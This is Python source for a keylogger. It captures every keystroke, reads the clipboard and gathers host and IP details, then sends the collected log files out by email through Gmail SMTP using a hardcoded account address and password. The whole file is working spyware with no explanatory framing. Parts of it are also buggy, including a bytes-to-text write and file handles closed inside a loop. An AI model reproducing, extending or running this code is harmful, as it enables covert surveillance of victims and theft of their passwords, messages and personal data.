import subprocess
import smtplib
from pynput.keyboard import Key, Listener
import platform
import socket
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

emailaddr = 'mykeyloggersa@gmail.com'
password = 'SA_keylogger'

log = 'log.txt'
sys_info = 'system_info.txt'
clipboard = 'clipboard.txt'

path = '/root/Desktop/'

keys = []
count = 0
iteration = 60

def computer_info():
    with open(path + sys_info, "a") as f:
        hostname = socket.gethostname()
        f.write("Hostname: " + hostname + "\n")
        IPAddr = socket.gethostbyname(hostname)
        f.write("Private IP Address: " + IPAddr + "\n")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')

computer_info()

def send_email(filename,attachment):
    msg = MIMEMultipart()
    msg['from'] = emailaddr
    msg['to'] = emailaddr

    msg['Subject'] = "keylogger"

    body = "body"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(emailaddr, password)

    text = msg.as_string()

    s.sendmail(emailaddr, emailaddr, text)

    s.quit()


def get_clipboard():
    p = subprocess.Popen(['xclip','-selection', 'clipboard', '-o'], stdout=subprocess.PIPE)
    retcode = p.wait()
    data = p.stdout.read()
    print(data)
    with open(path + clipboard,'a') as f:
        f.write(data)

get_clipboard()

while(1):

    def wirte_file(keys):
        with open(path + log, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_press(key):
        global keys,count

        print(key)
        keys.append(key)
        count += 1

        if count >= 1:
            wirte_file(keys)
            count = 0
            keys = []


    with Listener(on_press=on_press) as listener:
        listener.join()

    send_email(log,path+log)
    send_email(clipboard,path+clipboard)
    send_email(sys_info, path + sys_info)